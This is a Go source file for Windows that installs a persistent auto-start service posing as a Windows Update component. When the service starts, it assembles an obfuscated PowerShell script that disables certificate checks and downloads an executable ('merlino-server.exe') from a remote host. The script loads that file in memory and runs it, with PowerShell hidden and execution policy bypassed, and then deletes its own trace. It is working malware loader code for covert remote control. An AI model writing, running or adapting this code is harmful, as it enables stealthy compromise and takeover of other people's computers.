// +build windows

package main

import (
    "fmt"
    "os"
    "os/exec"
    "time"

    "golang.org/x/sys/windows"
    "golang.org/x/sys/windows/svc"
    "golang.org/x/sys/windows/svc/mgr"
)

const (
    serviceName = "WindowsUpdateAssistant"
    displayName = "Windows Update Assistant Service"
    description = "Manages Windows update components and configurations"
)

type myService struct{}

func (m *myService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
    const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
    changes <- svc.Status{State: svc.StartPending}
    
    go runPayload()
    
    changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
    
loop:
    for {
        select {
        case c := <-r:
            switch c.Cmd {
            case svc.Interrogate:
                changes <- c.CurrentStatus
            case svc.Stop, svc.Shutdown:
                break loop
            }
        }
    }
    
    changes <- svc.Status{State: svc.StopPending}
    return
}

func runPayload() {
    time.Sleep(5 * time.Second)
    
    // Build script parts separately
    part1 := "$" + "url = " + `"https://192.168.124.133/file/download"`
    part2 := "$" + "h = @{" + `"file"` + " = " + `"merlino-server.exe"` + "}"
    part3 := "[System.Net.ServicePointManager]::" + "ServerCertificateValidationCallback = {$" + "true}"
    part4 := "$" + "wc = New-Object System.Net.WebClient"
    part5 := "foreach($" + "key in $" + "h.Keys) { $" + "wc.Headers.Add($" + "key, $" + "h[$" + "key]) }"
    part6 := "$" + "b = $" + "wc.DownloadData($" + "url)"
    part7 := "$" + "a = [System.Reflection.Assembly]::" + "Load($" + "b)"
    part8 := "$" + "e = $" + "a.EntryPoint"
    part9 := "$" + "e.Invoke($" + "null, @(,[string[]]@()))"
    
    script := part1 + "\n" + part2 + "\n" + part3 + "\n" + part4 + "\n" + 
              part5 + "\n" + part6 + "\n" + part7 + "\n" + part8 + "\n" + part9
    
    tempPath := os.Getenv("TEMP") + "\\wu.ps1"
    os.WriteFile(tempPath, []byte(script), 0644)
    
    // Use cmd.exe to start powershell hidden
    cmd := exec.Command("cmd.exe", "/c", "start", "/b", "powershell.exe", 
                       "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", 
                       "-File", tempPath)
    cmd.Start()
    
    time.Sleep(10 * time.Second)
    os.Remove(tempPath)
}

func installService() error {
    exePath, err := os.Executable()
    if err != nil {
        return err
    }
    
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err == nil {
        s.Close()
        return fmt.Errorf("service already exists")
    }
    
    s, err = m.CreateService(serviceName, exePath, mgr.Config{
        DisplayName: displayName,
        Description: description,
        StartType:   windows.SERVICE_AUTO_START,
    })
    if err != nil {
        return err
    }
    defer s.Close()
    
    err = s.Start()
    if err != nil {
        return err
    }
    
    return nil
}

func removeService() error {
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err != nil {
        return fmt.Errorf("service not installed")
    }
    defer s.Close()
    
    s.Control(svc.Stop)
    time.Sleep(1 * time.Second)
    
    err = s.Delete()
    if err != nil {
        return err
    }
    
    return nil
}

func runService() error {
    return svc.Run(serviceName, &myService{})
}

func main() {
    isIntSess, err := svc.IsAnInteractiveSession()
    if err != nil {
        return
    }
    
    if !isIntSess {
        runService()
        return
    }
    
    if len(os.Args) < 2 {
        fmt.Println("Usage:")
        fmt.Println("  UpdateService.exe install   - Install and start service")
        fmt.Println("  UpdateService.exe remove    - Stop and remove service")
        return
    }
    
    cmd := os.Args[1]
    switch cmd {
    case "install":
        err := installService()
        if err != nil {
            fmt.Printf("Failed to install service: %v\n", err)
            return
        }
        fmt.Println("Service installed and started successfully")
    case "remove":
        err := removeService()
        if err != nil {
            fmt.Printf("Failed to remove service: %v\n", err)
            return
        }
        fmt.Println("Service removed successfully")
    default:
        fmt.Println("Unknown command")
    }
}
